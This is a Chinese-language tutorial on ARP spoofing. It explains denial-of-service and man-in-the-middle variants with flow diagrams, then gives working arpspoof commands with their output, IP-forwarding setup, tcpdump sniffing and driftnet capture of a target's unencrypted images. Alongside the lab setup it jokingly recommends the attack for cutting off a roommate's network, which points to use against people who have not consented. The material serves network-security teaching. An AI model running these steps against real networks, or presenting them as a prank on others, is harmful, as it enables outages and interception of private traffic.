ARP欺骗

一、概念

​ ARP欺骗（攻击）是指攻击设备向当前局域网发送ARP报文，这个报文是用于伪造网关设备发送的正常报文，干扰目标设备的ARP表，来实现中间人攻击的一种网络攻击方式。

​ 该类攻击方式主要发送在局域网中，尤其该局域网是静态IP分配的场景下，攻击者只要获取到目标设备的IP，就能通过arpspoof、Ettercap、Bettercap等攻击来实现攻击。

攻击设备：指攻击别人的设备

目标设备：指被攻击的设备

攻击者：实施攻击的人

二、攻击类型

​ ARP的攻击类型分为两种，分为：拒绝服务攻击和中间人攻击。

1.ARP流量欺骗

​ 在此类攻击中，通常是在攻击实现后，对目标设备网络实现全面代理，能对目标设备的报文进行拦截、丢弃，甚至能选择性使用一些报文通过，选择性不让一些报文通过等操作，从而实现拒绝服务攻击，通俗来说就是断网。

可达成的目的：

  • 网络限速
  • 间接断网
  • 完全断网
  • 屏蔽特定网络

2.中间人攻击

​ 在大多数ARP攻击中，主要就是用来实现中间人攻击，此类攻击具有很大的网络危害，攻击者因为完全接管了目标设备的所有流量。实现了双向毒化（干扰目标设备的同时还干扰网关设备，当完全干扰这两个设备后，就实现了双向毒化的目的）且转发数据后，那么此时目标设备走的任何数据都会被监听，攻击者能进行抓包、篡改数据(未加密)、DNS欺骗、会话劫持以及SSL降级等操作。

三、攻击流程图

​ 如下是流量正常的走向图：

graph TD;
    subgraph "正常流量路径"
        A[目标设备] <--> B[网关];
        B <--> C[互联网];
    end

​ 下面是被攻击后的流量走向图：

graph TD;
    subgraph "流量路径 (双向代理)"
        Target(目标设备) -- "1. 发出数据包" --> Attacker[攻击者];
        Attacker -- "2. 原样转发" --> Gateway(网关);
        Gateway -- "3. 返回数据包" --> Attacker;
        Attacker -- "4. 原样转发" --> Target;
    end

​ 在这种情况下，流量完全被代理，所有的操作都会被监控。

四、攻击方式

​ 在接下来的攻击实验中，建议准备如下内容：

  • kali或者其他Linux系统
  • 一台靶机
  • arpspoof工具
  • tcpdump工具
  • driftnet工具

1. ARP欺骗

​ ARP欺骗就是将目标设备的网络全部收过来，让我去处理这些网络，此时处理的方式为丢弃，即可实现断网攻击。

1.1 收集信息

​ 我们需要的信息为：网关IP、攻击设备网卡、目标设备IP。

1.获取自身设备的网卡

ifconfig # 这里选择的网卡是和目标设备在同一网段下的网卡

2.获取当前局域网的网关IP

ip route # default via 192.168.119.2 dev ens33 proto dhcp metric 100

3.获取目标设备IP

# 可使用nmap扫描工具来获取当前局域网所有的活跃IP，这里就假设已经找到了目标设备的IP

目前收集到的信息为：

  • 网关IP：192.168.119.2
  • 攻击设备网卡：ens33
  • 目标设备IP：192.168.119.133

1.2 实施攻击

root@aimang:~# arpspoof -i ens33 -t 192.168.119.133 192.168.119.2
0:c:29:6:58:4c 5e:bb:f6:9e:ee:fa 0806 42: arp reply 192.168.119.2 is-at 0:c:29:6:58:4c
0:c:29:6:58:4c 5e:bb:f6:9e:ee:fa 0806 42: arp reply 192.168.119.2 is-at 0:c:29:6:58:4c
0:c:29:6:58:4c 5e:bb:f6:9e:ee:fa 0806 42: arp reply 192.168.119.2 is-at 0:c:29:6:58:4c
0:c:29:6:58:4c 5e:bb:f6:9e:ee:fa 0806 42: arp reply 192.168.119.2 is-at 0:c:29:6:58:4c
...

​ 此时，攻击设备持续向目标设备发送错误的网关Mac地址，导致目标ARP表的网关IP被更改，此时当目标设备的网络丢包率接近100%，实现了断网攻击。在攻击设备取消攻击后，网络恢复正常。

1.3 流程图

graph TD
    A[攻击者] -- "发送伪造ARP应答
声称自己是网关" --> B[目标设备];
    B -- "更新ARP缓存
将攻击者MAC视为网关MAC" --> C{目标访问外网};
    C -- "将数据包发往
错误的MAC地址(攻击者)" --> A;
    A -- "丢弃收到的数据包
(因未开启IP转发)" --> D[x 数据丢失];
    D -- "导致" --> E[目标设备断网];

1.4 开启IP转发

echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

开启端口转发后，数据会经过攻击设备，但攻击设备会转发目标主机的流量。

1.5 价值

​ ARP欺骗的价值在于为中间人攻击（网络嗅探、会话劫持）搭建基础，它本身只负责流量重定向，是后续所有攻击的第一步。另外，也能作为制裁室友夜间打游戏的坏习惯。

2. 中间人攻击

攻击方式：获取用户浏览的图片

1.1 收集信息

​ 这一步已经在上面实现过，所以这里略了。

1.2 测试攻击（捕获数据并打印）

root@aimang:~# tcpdump -i ens33 host 192.168.119.133
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens33, link-type EN10MB (Ethernet), snapshot length 262144 bytes

​ 如上就已经实现攻击了，它会获取目标设备上所有的数据并且打印出来，例如目标地址访问了哪之类的。

1.3 实施攻击

1.使用arpspoof欺骗流量

root@aimang:~# arpspoof -i ens33 -t 192.168.119.133 192.168.119.2
0:c:29:6:58:4c 5e:bb:f6:9e:ee:fa 0806 42: arp reply 192.168.119.2 is-at 0:c:29:6:58:4c
0:c:29:6:58:4c 5e:bb:f6:9e:ee:fa 0806 42: arp reply 192.168.119.2 is-at 0:c:29:6:58:4c
...

2.使用drifnet监听并显示图片

driftnet -i ens33

PS：需要在桌面中打开终端运行，运行成功后，会出现一个窗口。可以获取所有未加密（HTTP）的图片
